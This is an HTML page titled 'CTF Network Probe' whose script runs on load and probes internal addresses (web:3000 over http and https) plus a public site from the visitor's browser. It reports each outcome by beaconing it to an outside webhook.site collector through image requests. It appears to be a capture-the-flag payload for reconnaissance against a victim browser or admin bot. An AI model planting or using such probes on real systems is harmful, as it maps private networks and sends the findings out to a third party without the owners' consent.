
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CTF Network Probe</title>
</head>
<body>
  <h1>Network Probe</h1>
  <script>
    const hook = "https://webhook.site/676ec5ae-a5f2-49f7-8044-21c48e3f6a35";

    function report(name, result) {
      const url = new URL(hook);
      url.searchParams.set("test", name);
      url.searchParams.set("result", result);
      new Image().src = url.toString();
    }

    async function probe(name, url) {
      try {
        await fetch(url, {
          mode: "no-cors",
          cache: "no-store"
        });
        report(name, "fetch-resolved");
      } catch (e) {
        report(name, "fetch-error-" + e.name);
      }
    }

    probe("public-https", "https://example.com/");
    probe("internal-http", "http://web:3000/");
    probe("internal-https", "https://web:3000/");
  </script>
</body>
</html>
